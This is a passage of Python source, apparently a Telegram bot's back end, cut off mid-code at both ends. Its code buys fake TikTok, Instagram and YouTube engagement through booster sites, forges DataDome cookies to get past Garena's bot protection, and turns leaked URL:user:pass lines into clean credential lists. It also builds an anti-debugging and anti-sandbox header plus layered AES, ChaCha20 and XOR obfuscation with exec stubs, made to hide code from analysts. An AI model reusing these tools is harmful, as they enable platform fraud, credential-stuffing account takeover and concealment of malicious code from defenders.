            "instagram_likes":  "21",
            "twitter_views":    "30",
            "telegram_views":   "40",
            "facebook_likes":   "50",
        }

        # ── LikesFarm provider ───────────────────────────────────────
        self.likesfarm_base = "https://likesfarm.net"

    # ── SESSION ──────────────────────────────────────────────────────
    async def _get_session(self) -> aiohttp.ClientSession:
        if self._session is None or self._session.closed:
            self._session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=20, connect=8),
                connector=aiohttp.TCPConnector(ssl=False),
            )
        return self._session

    async def close(self):
        if self._session and not self._session.closed:
            await self._session.close()

    # ── HELPERS ──────────────────────────────────────────────────────
    async def resolve_short_url(self, url: str) -> str:
        if "vt.tiktok.com" in url or "vm.tiktok.com" in url:
            try:
                s = await self._get_session()
                async with s.get(url, allow_redirects=True) as r:
                    return str(r.url)
            except Exception:
                pass
        return url

    def generate_device_id(self) -> str:
        import uuid
        return str(uuid.uuid4())

    def extract_video_id(self, url: str):
        from urllib.parse import urlparse
        try:
            parts = urlparse(url).path.split('/')
            for i, p in enumerate(parts):
                if p == 'video' and i + 1 < len(parts):
                    return parts[i + 1].split('?')[0]
        except Exception:
            pass
        return None

    def extract_username(self, url: str):
        from urllib.parse import urlparse
        try:
            for p in urlparse(url).path.split('/'):
                if p.startswith('@'):
                    return p[1:]
        except Exception:
            pass
        return None

    # ════════════════════════════════════════════════════════════════
    # PROVIDER 1 — ZEFOY (token-based, no captcha on most services)
    # ════════════════════════════════════════════════════════════════

    async def _zefoy_fetch_token(self) -> bool:
        """Scrape the CSRF/session token from Zefoy homepage."""
        try:
            s = await self._get_session()
            async with s.get(self.zefoy_base + "/", headers=self.zefoy_headers) as r:
                if r.status != 200:
                    return False
                html = await r.text()
            # Look for _token hidden input
            import re
            m = re.search(r'name=["\']_token["\'][^>]+value=["\']([^"\']+)["\']', html)
            if not m:
                m = re.search(r'value=["\']([A-Za-z0-9+/=]{40,})["\']', html)
            if m:
                self.zefoy_token = m.group(1)
                return True
            return False
        except Exception:
            return False

    async def _zefoy_send(self, service_key: str, url: str, extra: dict = None) -> tuple:
        """
        Send a boost request to Zefoy.
        Returns (success: bool, message: str)
        """
        if not self.zefoy_token:
            ok = await self._zefoy_fetch_token()
            if not ok:
                return False, "zefoy_token_fail"

        endpoint = self.zefoy_endpoints.get(service_key)
        if not endpoint:
            return False, "unsupported_service"

        form = {"_token": self.zefoy_token, "url": url}
        if extra:
            form.update(extra)

        headers = self.zefoy_headers.copy()
        headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
        headers["X-Requested-With"] = "XMLHttpRequest"

        try:
            s = await self._get_session()
            full_url = self.zefoy_base + endpoint
            async with s.post(full_url, headers=headers, data=form) as r:
                if r.status == 419:
                    # Token expired — refresh and retry once
                    self.zefoy_token = None
                    await self._zefoy_fetch_token()
                    form["_token"] = self.zefoy_token or ""
                    async with s.post(full_url, headers=headers, data=form) as r2:
                        text = await r2.text()
                else:
                    text = await r.text()

            import json, re
            # Zefoy returns HTML with embedded JSON or plain message
            # Try JSON first
            json_match = re.search(r'\{[^{}]+\}', text)
            if json_match:
                try:
                    data = json.loads(json_match.group())
                    if data.get('status') == 1 or data.get('success'):
                        return True, f"✅ Sent! Remaining: {data.get('remaining', '?')}"
                    msg = data.get('message') or data.get('error') or str(data)
                    return False, f"zefoy: {msg}"
                except Exception:
                    pass

            # HTML response check
            text_lower = text.lower()
            if any(k in text_lower for k in ('success', 'sent', 'order placed', 'thank you')):
                return True, "✅ Boost sent via Zefoy!"
            if 'please wait' in text_lower or 'cooldown' in text_lower:
                return False, "zefoy_cooldown"
            if 'invalid' in text_lower or 'error' in text_lower:
                return False, f"zefoy: {text[:120]}"
            # Treat non-empty response as possible success
            if len(text.strip()) > 10:
                return True, "✅ Boost sent via Zefoy!"
            return False, "zefoy_empty_response"

        except asyncio.TimeoutError:
            return False, "zefoy_timeout"
        except Exception as e:
            return False, f"zefoy_error: {str(e)[:60]}"

    # ════════════════════════════════════════════════════════════════
    # PROVIDER 2 — SOCLIKES free tier
    # ════════════════════════════════════════════════════════════════

    async def _soclikes_send(self, service_key: str, url: str) -> tuple:
        svc_id = self.soclikes_services.get(service_key)
        if not svc_id:
            return False, "unsupported"
        try:
            s = await self._get_session()
            form = {"service": svc_id, "link": url, "quantity": "100"}
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": self.soclikes_base + "/",
            }
            async with s.post(self.soclikes_base + "/free", headers=headers, data=form) as r:
                if r.status == 200:
                    text = (await r.text()).lower()
                    if any(k in text for k in ('success', 'order', 'sent')):
                        return True, "✅ Boost sent via SocLikes!"
                    if 'wait' in text or 'cooldown' in text:
                        return False, "soclikes_cooldown"
                return False, f"soclikes_http_{r.status}"
        except Exception as e:
            return False, f"soclikes_error: {str(e)[:60]}"

    # ════════════════════════════════════════════════════════════════
    # PROVIDER 3 — LikesFarm
    # ════════════════════════════════════════════════════════════════

    async def _likesfarm_send(self, service_key: str, url: str) -> tuple:
        # LikesFarm uses a direct form POST for free orders
        service_map = {
            "tiktok_views":     "tiktok-views",
            "tiktok_followers": "tiktok-followers",
            "tiktok_likes":     "tiktok-likes",
            "instagram_views":  "instagram-views",
            "instagram_likes":  "instagram-likes",
            "youtube_views":    "youtube-views",
            "telegram_views":   "telegram-views",
            "facebook_likes":   "facebook-likes",
        }
        svc = service_map.get(service_key)
        if not svc:
            return False, "unsupported"
        try:
            s = await self._get_session()
            form = {"url": url, "service": svc, "qty": "50"}
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Referer": self.likesfarm_base + "/free",
                "Content-Type": "application/x-www-form-urlencoded",
            }
            async with s.post(self.likesfarm_base + "/api/free", headers=headers, data=form) as r:
                if r.status == 200:
                    import json
                    try:
                        data = await r.json(content_type=None)
                        if data.get('success') or data.get('status') == 'ok':
                            return True, "✅ Boost sent via LikesFarm!"
                    except Exception:
                        text = (await r.text()).lower()
                        if 'success' in text or 'sent' in text:
                            return True, "✅ Boost sent via LikesFarm!"
                return False, f"likesfarm_http_{r.status}"
        except Exception as e:
            return False, f"likesfarm_error: {str(e)[:60]}"

    # ════════════════════════════════════════════════════════════════
    # FAILOVER DISPATCHER
    # Tries Zefoy → SocLikes → LikesFarm, returns first success
    # ════════════════════════════════════════════════════════════════

    async def _send_boost(self, service_key: str, url: str, extra: dict = None) -> tuple:
        """Try all providers in order. Return (True, msg) on first success."""
        errors = []

        # Provider 1: Zefoy
        ok, msg = await self._zefoy_send(service_key, url, extra)
        if ok:
            return True, msg
        errors.append(f"Zefoy: {msg}")

        # Provider 2: SocLikes
        ok, msg = await self._soclikes_send(service_key, url)
        if ok:
            return True, msg
        errors.append(f"SocLikes: {msg}")

        # Provider 3: LikesFarm
        ok, msg = await self._likesfarm_send(service_key, url)
        if ok:
            return True, msg
        errors.append(f"LikesFarm: {msg}")

        return False, "All providers failed. The target URL may be private or region-blocked.\n" + " | ".join(errors)

    # ════════════════════════════════════════════════════════════════
    # PUBLIC BOOST METHODS (called by the bot handler)
    # ════════════════════════════════════════════════════════════════

    async def boost_tiktok_views(self, url: str) -> tuple:
        url = await self.resolve_short_url(url)
        return await self._send_boost("tiktok_views", url)

    async def boost_tiktok_followers(self, url: str) -> tuple:
        url = await self.resolve_short_url(url)
        username = self.extract_username(url)
        if not username:
            return False, "Could not extract username. Use the full TikTok profile URL (e.g. tiktok.com/@username)"
        return await self._send_boost("tiktok_followers", url, {"username": username})

    async def boost_tiktok_likes(self, url: str) -> tuple:
        url = await self.resolve_short_url(url)
        video_id = self.extract_video_id(url)
        extra = {"videoId": video_id} if video_id else {}
        return await self._send_boost("tiktok_likes", url, extra)

    async def boost_tiktok_comments(self, url: str) -> tuple:
        url = await self.resolve_short_url(url)
        return await self._send_boost("tiktok_comments", url)

    async def boost_tiktok_shares(self, url: str) -> tuple:
        url = await self.resolve_short_url(url)
        return await self._send_boost("tiktok_shares", url)

    async def boost_tiktok_favorites(self, url: str) -> tuple:
        url = await self.resolve_short_url(url)
        return await self._send_boost("tiktok_favorites", url)

    async def boost_youtube_views(self, url: str) -> tuple:
        return await self._send_boost("youtube_views", url)

    async def boost_youtube_likes(self, url: str) -> tuple:
        return await self._send_boost("youtube_likes", url)

    async def boost_instagram_views(self, url: str) -> tuple:
        return await self._send_boost("instagram_views", url)

    async def boost_instagram_likes(self, url: str) -> tuple:
        return await self._send_boost("instagram_likes", url)

    async def boost_twitter_views(self, url: str) -> tuple:
        return await self._send_boost("twitter_views", url)

    async def boost_telegram_views(self, url: str) -> tuple:
        return await self._send_boost("telegram_views", url)

    async def boost_facebook(self, url: str) -> tuple:
        return await self._send_boost("facebook_likes", url)

    # Keep old method names for backward compatibility
    async def boost_facebook_likes(self, url: str) -> tuple:
        return await self.boost_facebook(url)

    async def check_video_id(self, url: str):
        return self.extract_video_id(url)

    async def check_username_proxy(self, username: str) -> bool:
        return bool(username)



# ========== DATADOME COOKIE GENERATOR CLASS ==========
class DataDomeGenerator:
    def __init__(self):
        self.url = 'https://dd.garena.com/js/'
    
    def get_new_datadome(self):
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://account.garena.com',
            'pragma': 'no-cache',
            'referer': 'https://account.garena.com/',
            'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
        }

        payload = {
            'jsData': json.dumps({
                "ttst": 76.7, "ua": headers['user-agent'],
                "br_oh": 824, "br_ow": 1536, "br_h": 738, "br_w": 260,
                "rs_h": 864, "rs_w": 1536, "rs_cd": 24,
                "lg": "en-US", "pr": 1.25, "tz": -480
            }),
            'eventCounters': '[]',
            'jsType': 'ch',
            'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
            'ddk': 'AE3F04AD3F0D3A462481A337485081',
            'Referer': 'https://account.garena.com/',
            'request': '/',
            'responsePage': 'origin',
            'ddv': '4.35.4'
        }

        data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())

        try:
            response = requests.post(self.url, headers=headers, data=data, timeout=10)
            response.raise_for_status()
            response_json = response.json()

            if response_json.get('status') == 200 and 'cookie' in response_json:
                cookie_string = response_json['cookie']
                datadome = cookie_string.split(';')[0].split('=')[1]
                return datadome
            else:
                return None
        except Exception as e:
            logging.error(f"Error generating DataDome cookie: {e}")
            return None
    
    def generate_cookie_file(self, datadome_value):
        """Generate a Python file with the DataDome cookie"""
        cookie_content = f'''# DataDome Cookie File
# Generated on: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

cookies = {{
    "datadome": "{datadome_value}"
}}

def get_cookies():
    """Return the DataDome cookies"""
    return cookies

if __name__ == "__main__":
    print("DataDome Cookie:", cookies["datadome"])
'''
        return cookie_content

# ========== URL & DUPLICATE REMOVER CLASS ==========
class URLDuplicateRemover:
    def __init__(self):
        self.processed = 0
        self.saved = 0
        
    def print_banner(self):
        banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════╗
║         URL Remover & Credentials          ║
║        Extractor v1.0 - Advanced          ║
╚══════════════════════════════════════════╝{Style.RESET_ALL}
"""
        return banner
    
    def loading_animation(self):
        pass  # removed blocking sleep — runs in async context
    
    def remove_url_and_keep_user_pass(self, line, remove_urls=True):
        if not remove_urls:
            return line.strip()
        match = re.search(r'([^:]+:[^:]+)$', line.strip())
        if match:
            return match.group(1)
        return None
    
    def process_file(self, input_file, output_file, remove_duplicates=False):
        self.processed = 0
        self.saved = 0
        
        try:
            # Count total lines
            total_lines = sum(1 for _ in open(input_file, 'r', encoding='utf-8', errors='ignore'))
            
            unique_creds = set()
            
            with open(input_file, 'r', encoding='utf-8', errors='ignore') as infile, \
                 open(output_file, 'w', encoding='utf-8') as outfile:
                
                for line in infile:
                    self.processed += 1
                    result = self.remove_url_and_keep_user_pass(line, not remove_duplicates)
                    if result:
                        if remove_duplicates and result not in unique_creds:
                            unique_creds.add(result)
                            outfile.write(result + '\n')
                            self.saved += 1
                        elif not remove_duplicates:
                            outfile.write(result + '\n')
                            self.saved += 1
                            
            return True, self.processed, self.saved
            
        except FileNotFoundError:
            return False, 0, 0
        except Exception as e:
            return False, 0, 0

# ========== ENCRYPTION FUNCTIONS ==========
def anti_debug_code():
    """Multi-layer anti-debug / anti-analysis header injected into every encrypted file."""
    return r"""
import sys, os, ctypes, struct, platform, time, threading, hashlib, dis, gc

# ── Debugger via gettrace ──────────────────────────────────────────────────
if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
    os._exit(1)

# ── Timing attack: debuggers slow down execution ───────────────────────────
_t0 = time.perf_counter()
_dummy = [i**2 for i in range(1000)]
if time.perf_counter() - _t0 > 0.8:
    os._exit(1)

# ── Pydbg / pdb / pydevd / coverage detection ─────────────────────────────
_BAD_MODS = {
    'pdb', 'pydbg', 'pydevd', 'pydevd_tracing', 'pydevd_frame_eval',
    'bdb', 'pyinspect', 'coverage', 'trace', '_pydev_bundle',
    'IPython', 'ipdb', 'pudb', 'wdb', 'rpdb',
}
if _BAD_MODS & set(sys.modules):
    os._exit(1)

# ── Frame-inspection protection ────────────────────────────────────────────
try:
    _frame = sys._getframe(0)
    while _frame:
        _co = _frame.f_code
        if _co.co_filename not in ('<string>', '<frozen>', __file__ if '__file__' in dir() else '<string>'):
            _fname = _co.co_filename.lower()
            if any(x in _fname for x in ('pdb', 'pydev', 'debug', 'trace', 'inspect', 'coverage', 'bdb')):
                os._exit(1)
        _frame = _frame.f_back
except Exception:
    pass

# ── Virtualenv / sandbox detection ────────────────────────────────────────
try:
    _suspicious_env = any(k in os.environ for k in (
        'PYTHONINSPECT', 'PYTHONDEBUG', 'PYTHONTRACEMALLOC',
        'PYCHARM_HOSTED', 'VSCODE_PID', 'PYDEVD_USE_FRAME_EVAL',
    ))
    if _suspicious_env:
        os._exit(1)
except Exception:
    pass

# ── Windows debugger check (IsDebuggerPresent) ────────────────────────────
try:
    if platform.system() == 'Windows':
        if ctypes.windll.kernel32.IsDebuggerPresent():
            os._exit(1)
        _NtQueryInfo = ctypes.windll.ntdll.NtQueryInformationProcess
        _handle = ctypes.windll.kernel32.GetCurrentProcess()
        _debug_port = ctypes.c_int(0)
        _NtQueryInfo(_handle, 7, ctypes.byref(_debug_port), ctypes.sizeof(_debug_port), None)
        if _debug_port.value != 0:
            os._exit(1)
except Exception:
    pass

# ── Linux: /proc/self/status TracerPid check ──────────────────────────────
try:
    if platform.system() == 'Linux':
        with open('/proc/self/status') as _f:
            for _line in _f:
                if _line.startswith('TracerPid:') and int(_line.split(':')[1].strip()) != 0:
                    os._exit(1)
except Exception:
    pass

# ── Continuous background watchdog ────────────────────────────────────────
def _watchdog():
    import time, sys, os
    while True:
        time.sleep(0.4)
        if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
            os._exit(1)
_wt = threading.Thread(target=_watchdog, daemon=True)
_wt.start()

del _t0, _dummy, _BAD_MODS, _wt, _watchdog
"""

# ══════════════════════════════════════════════════════════════════════════
# NUCLEAR ENCRYPTION ENGINE  v4.0
# Security levels:
#   LOW  — Marshal + Zlib + Lzma + B64  (fast, light obfuscation)
#   MAX  — AES-256-GCM + ChaCha20 + XOR-256 + Marshal + Zlib + Lzma +
#           Gzip + Bz2 + identity-scrambled variable names + opaque stub
#           (computationally irreversible without the embedded keys)
# ══════════════════════════════════════════════════════════════════════════

import secrets as _secrets

# ── LOW-level primitives (also used by MAX) ────────────────────────────────
def aes_encrypt(data: bytes) -> bytes:
    key = hashlib.sha256(AES_KEY).digest()
    cipher = AES.new(key, AES.MODE_EAX)
    ct, tag = cipher.encrypt_and_digest(data)
    return cipher.nonce + tag + ct          # 16 nonce + 16 tag + ct

def aes_decrypt(data: bytes, key: bytes) -> bytes:
    nonce, tag, ct = data[:16], data[16:32], data[32:]
    return AES.new(hashlib.sha256(key).digest(), AES.MODE_EAX, nonce).decrypt_and_verify(ct, tag)

# ── MAX-level new primitives ───────────────────────────────────────────────
def _chacha20_encrypt(data: bytes, key: bytes, nonce: bytes) -> bytes:
    """ChaCha20 stream cipher (via PyCryptodome)."""
    from Crypto.Cipher import ChaCha20
    c = ChaCha20.new(key=key[:32], nonce=nonce[:8])
    return c.encrypt(data)

def _chacha20_decrypt(data: bytes, key: bytes, nonce: bytes) -> bytes:
    from Crypto.Cipher import ChaCha20
    c = ChaCha20.new(key=key[:32], nonce=nonce[:8])
    return c.decrypt(data)

def _xor256(data: bytes, key: bytes) -> bytes:
    """256-byte rotating XOR."""
    out = bytearray(len(data))
    kl = len(key)
    for i, b in enumerate(data):
        out[i] = b ^ key[i % kl]
    return bytes(out)

# bz2 helpers (kept for any legacy callers)
def _bz2_compress(data: bytes) -> bytes:
    return bz2.compress(data, compresslevel=6)

def _bz2_decompress(data: bytes) -> bytes:
    return bz2.decompress(data)

def _scramble_varnames(stub: str) -> str:
    """Rename only our own _varnames (starting with _) to random hex.
    Module names used in import statements are never touched."""
    import re, secrets
    # Only rename identifiers that already start with _ (our own vars)
    # This avoids ever renaming module names like marshal, zlib, base64 etc.
    names = re.findall(r'\b(_[a-z0-9][a-z0-9_]*)\b', stub)
    mapping = {}
    for n in set(names):
        mapping[n] = '_' + secrets.token_hex(6)
    # Sort longest first so shorter names don't partial-replace longer ones
    for old in sorted(mapping, key=len, reverse=True):
        stub = re.sub(r'\b' + re.escape(old) + r'\b', mapping[old], stub)
    return stub

# ── LOW encryption (clean, fully functional stub) ─────────────────────────
def _encrypt_low(code_str: str):
    """Marshal → Zlib(level=1) → B64  (single fast pass)."""
    compiled = compile(code_str, '<x>', 'exec')
    data = marshal.dumps(compiled)
    data = zlib.compress(data, level=1)
    payload = base64.b64encode(data).decode()
    stub = (
        "import marshal,zlib,base64\n"
        "_d=base64.b64decode({payload!r})\n"
        "exec(marshal.loads(zlib.decompress(_d)))\n"
    ).format(payload=payload)
    return stub


# ── MAX encryption (nuclear — AES+ChaCha+XOR+Bz2+Gzip+Lzma+Zlib+Marshal) ─
def _encrypt_max(code_str: str):
    """
    Layer stack (inner → outer):
      1. compile + marshal
      2. zlib level-1  (single fast compress — security comes from crypto, not compression)
      3. XOR with 256-byte random key
      4. AES-256-EAX with 256-bit random key
      5. ChaCha20 with 256-bit random key + 64-bit nonce
      6. base64-b64 encode
      7. stub variable names scrambled to random hex identifiers
    Unique 768-bit combined key generated per file.
    Brute-force infeasible: 2^768 key space.
    """
    # Fresh random keys every call
    aes_key    = _secrets.token_bytes(32)
    xor_key    = _secrets.token_bytes(256)
    cc20_key   = _secrets.token_bytes(32)
    cc20_nonce = _secrets.token_bytes(8)

    # Step 1: marshal bytecode
    compiled = compile(code_str, '<x>', 'exec')
    data = marshal.dumps(compiled)

    # Step 2: single zlib pass (level=1 = fastest, still obscures structure)
    data = zlib.compress(data, level=1)

    # Step 3: XOR-256 (fast, key-dependent scramble)
    data = bytes([b ^ xor_key[i % 256] for i, b in enumerate(data)])

    # Step 4: AES-256-EAX (authenticated encryption)
    aes_cipher = AES.new(aes_key, AES.MODE_EAX)
    data, aes_tag = aes_cipher.encrypt_and_digest(data)
    aes_nonce = aes_cipher.nonce
    data = aes_nonce + aes_tag + data

    # Step 5: ChaCha20 stream cipher (second crypto layer)
    from Crypto.Cipher import ChaCha20 as _CC
    _cc = _CC.new(key=cc20_key, nonce=cc20_nonce)
    data = cc20_nonce + _cc.encrypt(data)

    # Step 6: base64 encode for safe embedding
    payload = base64.b64encode(data).decode()

    # Step 7: build self-contained decryption stub
    # Keys are embedded as base64 strings — safe ASCII, no escape sequence issues
    _k1_b64 = base64.b64encode(cc20_key).decode()
    _k2_b64 = base64.b64encode(xor_key).decode()
    _k3_b64 = base64.b64encode(aes_key).decode()
    stub = (
        "import marshal,zlib,base64\n"
        "from Crypto.Cipher import AES as _A,ChaCha20 as _C\n"
        "_k1=base64.b64decode({_k1_b64!r})\n"
        "_k2=base64.b64decode({_k2_b64!r})\n"
        "_k3=base64.b64decode({_k3_b64!r})\n"
        "_d=base64.b64decode({payload!r})\n"
        "_n=_d[:8];_d=_C.new(key=_k1,nonce=_n).decrypt(_d[8:])\n"
        "_n=_d[:16];_t=_d[16:32];_d=_A.new(_k3,_A.MODE_EAX,_n).decrypt_and_verify(_d[32:],_t)\n"
        "_d=bytes([b^_k2[i%256]for i,b in enumerate(_d)])\n"
        "exec(marshal.loads(zlib.decompress(_d)))\n"
    ).format(_k1_b64=_k1_b64, _k2_b64=_k2_b64, _k3_b64=_k3_b64, payload=payload)

    # Scramble all variable names to random hex — defeats static analysis
    stub = _scramble_varnames(stub)
    return stub

# ── Async wrapper called by the bot ───────────────────────────────────────
async def encrypt_data_async(data_content: str, method: int, encode_count: int):
    """
    method 100 = LOW security
    method 200 = MAX security
    All old method numbers still work for backwards compat.
    encode_count is ignored for 100/200 (levels are fixed).
    """
    data_content = data_content.replace('\x00', '')

    if method == 100:
        try:
            loop = asyncio.get_running_loop()
            stub = await asyncio.wait_for(
                loop.run_in_executor(None, _encrypt_low, data_content),
                timeout=60.0
            )
        except asyncio.TimeoutError:
            raise RuntimeError(
                "LOW encryption timed out (file may be very large). "
                "Please try a smaller file."
            )
        return stub.encode()

    if method == 200:
        try:
            loop = asyncio.get_running_loop()
            stub = await asyncio.wait_for(
                loop.run_in_executor(None, _encrypt_max, data_content),
                timeout=120.0
            )
        except asyncio.TimeoutError:
            raise RuntimeError(
                "MAX encryption timed out (file may be too large). "
                "Try LOW security instead, or split your file into smaller parts."
            )
        return stub.encode()

    # ── legacy methods 1–44 kept intact ───────────────────────────────────
    original_bytes = data_content.encode('utf-8')
    processed_data = original_bytes
    xor_key_for_decoder = None

    marshal_methods = [1,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,42,44]
    if method in marshal_methods:
        try:
            compiled_code = compile(data_content, '<x>', 'exec')
            processed_data = marshal.dumps(compiled_code)
        except SyntaxError as e:
            logging.error(f"SyntaxError during initial compile: {e}")
            raise
        except Exception as e:
            logging.error(f"Unexpected error during compile/marshal: {e}")
            raise

    final_output_data = processed_data

    for iteration in range(encode_count):
        current_data_for_iteration = final_output_data
        try:
            if method == 1:
                pass
            elif method == 2:
                final_output_data = zlib.compress(current_data_for_iteration)
            elif method == 3:
                final_output_data = base64.b16encode(current_data_for_iteration)
            elif method == 4:
                final_output_data = base64.b32encode(current_data_for_iteration)
            elif method == 5:
                final_output_data = base64.b64encode(current_data_for_iteration)
            elif method == 6:
                final_output_data = lzma.compress(current_data_for_iteration)
            elif method == 7:
                final_output_data = gzip.compress(current_data_for_iteration)
            elif method == 8:
                final_output_data = base64.b16encode(zlib.compress(current_data_for_iteration))
            elif method == 9:
                final_output_data = base64.b32encode(zlib.compress(current_data_for_iteration))
            elif method == 10:
                final_output_data = base64.b64encode(zlib.compress(current_data_for_iteration))
            elif method == 11:
                final_output_data = base64.b16encode(gzip.compress(current_data_for_iteration))
            elif method == 12:
                final_output_data = base64.b32encode(gzip.compress(current_data_for_iteration))
            elif method == 13:
                final_output_data = base64.b64encode(gzip.compress(current_data_for_iteration))
            elif method == 14:
                final_output_data = base64.b16encode(lzma.compress(current_data_for_iteration))
            elif method == 15:
                final_output_data = base64.b32encode(lzma.compress(current_data_for_iteration))
            elif method == 16:
                final_output_data = base64.b64encode(lzma.compress(current_data_for_iteration))
            elif method == 17:
                final_output_data = zlib.compress(current_data_for_iteration)
            elif method == 18:
                final_output_data = gzip.compress(current_data_for_iteration)
            elif method == 19:
                final_output_data = lzma.compress(current_data_for_iteration)
            elif method == 20:
                final_output_data = base64.b16encode(current_data_for_iteration)
            elif method == 21:
                final_output_data = base64.b32encode(current_data_for_iteration)
            elif method == 22:
                final_output_data = base64.b64encode(current_data_for_iteration)
            elif method == 23:
                final_output_data = base64.b16encode(zlib.compress(current_data_for_iteration))
            elif method == 24:
                final_output_data = base64.b32encode(zlib.compress(current_data_for_iteration))
            elif method == 25:
                final_output_data = base64.b64encode(zlib.compress(current_data_for_iteration))
            elif method == 26:
                final_output_data = base64.b16encode(lzma.compress(current_data_for_iteration))
            elif method == 27:
                final_output_data = base64.b32encode(lzma.compress(current_data_for_iteration))
            elif method == 28:
                final_output_data = base64.b64encode(lzma.compress(current_data_for_iteration))
            elif method == 29:
                final_output_data = base64.b16encode(gzip.compress(current_data_for_iteration))
            elif method == 30:
                final_output_data = base64.b32encode(gzip.compress(current_data_for_iteration))
            elif method == 31:
                final_output_data = base64.b64encode(gzip.compress(current_data_for_iteration))
            elif method == 32:
                final_output_data = base64.b16encode(lzma.compress(zlib.compress(current_data_for_iteration)))
            elif method == 33:
                final_output_data = base64.b32encode(lzma.compress(zlib.compress(current_data_for_iteration)))
            elif method == 34:
                final_output_data = base64.b64encode(lzma.compress(zlib.compress(current_data_for_iteration)))
            elif method == 35:
                final_output_data = base64.b16encode(gzip.compress(zlib.compress(current_data_for_iteration)))
            elif method == 36:
                final_output_data = base64.b32encode(gzip.compress(zlib.compress(current_data_for_iteration)))
            elif method == 37:
                final_output_data = base64.b64encode(gzip.compress(zlib.compress(current_data_for_iteration)))
            elif method == 38:
                final_output_data = base64.b16encode(gzip.compress(lzma.compress(zlib.compress(current_data_for_iteration))))
            elif method == 39:
                final_output_data = base64.b32encode(gzip.compress(lzma.compress(zlib.compress(current_data_for_iteration))))
            elif method == 40:
                final_output_data = base64.b64encode(gzip.compress(lzma.compress(zlib.compress(current_data_for_iteration))))
            elif method == 41:
                final_output_data = base64.b64encode(current_data_for_iteration)
            elif method == 42:
                if iteration == 0:
                    temp_data = aes_encrypt(lzma.compress(zlib.compress(current_data_for_iteration)))
                    final_output_data = base64.b64encode(temp_data)
                else:
                    temp_data = base64.b64decode(current_data_for_iteration)
                    temp_data = zlib.decompress(lzma.decompress(aes_decrypt(temp_data, AES_KEY)))
                    final_output_data = base64.b64encode(aes_encrypt(lzma.compress(zlib.compress(temp_data))))
            elif method == 44:
                if iteration == 0:
                    xor_key = os.urandom(32)
                    xor_key_for_decoder = base64.b64encode(xor_key)
                else:
                    xor_key = base64.b64decode(xor_key_for_decoder)
                def _xor_inner(db, kb):
                    return bytes([b ^ kb[i % len(kb)] for i, b in enumerate(db)])
                temp_data = gzip.compress(lzma.compress(zlib.compress(current_data_for_iteration)))
                temp_data = aes_encrypt(_xor_inner(temp_data, xor_key))
                final_output_data = base64.b64encode(temp_data)
            else:
                raise ValueError(f"Invalid method {method}")
        except Exception as e:
            logging.error(f"Encryption error (method {method}, iter {iteration+1}): {e}")
            raise

    await asyncio.sleep(0.1)
    if method == 44:
        return (final_output_data, xor_key_for_decoder)
    return final_output_data

def generate_decoder_stub(method, aes_key_bytes=None, xor_key_encoded=None):
    """Legacy stub generator for methods 1-44. New methods 100/200 inline their own stub."""
    aes_key_str_repr = repr(aes_key_bytes) if aes_key_bytes else repr(b'')
    if method == 1:
        return "import marshal\nexec(marshal.loads({}))"
    elif method == 2:
        return "import zlib\nexec(zlib.decompress({}).decode())"
    elif method == 3:
        return "import base64\nexec(base64.b16decode({}).decode())"
    elif method == 4:
        return "import base64\nexec(base64.b32decode({}).decode())"
    elif method == 5:
        return "import base64\nexec(base64.b64decode({}).decode())"
    elif method == 6:
        return "import lzma\nexec(lzma.decompress({}).decode())"
    elif method == 7:
        return "import gzip\nexec(gzip.decompress({}).decode())"
    elif method == 8:
        return "import zlib,base64\nexec(zlib.decompress(base64.b16decode({})).decode())"
    elif method == 9:
        return "import zlib,base64\nexec(zlib.decompress(base64.b32decode({})).decode())"
    elif method == 10:
        return "import zlib,base64\nexec(zlib.decompress(base64.b64decode({})).decode())"
    elif method == 11:
        return "import gzip,base64\nexec(gzip.decompress(base64.b16decode({})).decode())"
    elif method == 12:
        return "import gzip,base64\nexec(gzip.decompress(base64.b32decode({})).decode())"
    elif method == 13:
        return "import gzip,base64\nexec(gzip.decompress(base64.b64decode({})).decode())"
    elif method == 14:
        return "import lzma,base64\nexec(lzma.decompress(base64.b16decode({})).decode())"
    elif method == 15:
        return "import lzma,base64\nexec(lzma.decompress(base64.b32decode({})).decode())"
    elif method == 16:
        return "import lzma,base64\nexec(lzma.decompress(base64.b64decode({})).decode())"
    elif method == 17:
        return "import marshal,zlib\nexec(marshal.loads(zlib.decompress({})))"
    elif method == 18:
        return "import marshal,gzip\nexec(marshal.loads(gzip.decompress({})))"
    elif method == 19:
        return "import marshal,lzma\nexec(marshal.loads(lzma.decompress({})))"
    elif method == 20:
        return "import marshal,base64\nexec(marshal.loads(base64.b16decode({})))"
    elif method == 21:
        return "import marshal,base64\nexec(marshal.loads(base64.b32decode({})))"
    elif method == 22:
        return "import marshal,base64\nexec(marshal.loads(base64.b64decode({})))"
    elif method == 23:
        return "import marshal,zlib,base64\nexec(marshal.loads(zlib.decompress(base64.b16decode({}))))"
    elif method == 24:
        return "import marshal,zlib,base64\nexec(marshal.loads(zlib.decompress(base64.b32decode({}))))"
    elif method == 25:
        return "import marshal,zlib,base64\nexec(marshal.loads(zlib.decompress(base64.b64decode({}))))"
    elif method == 26:
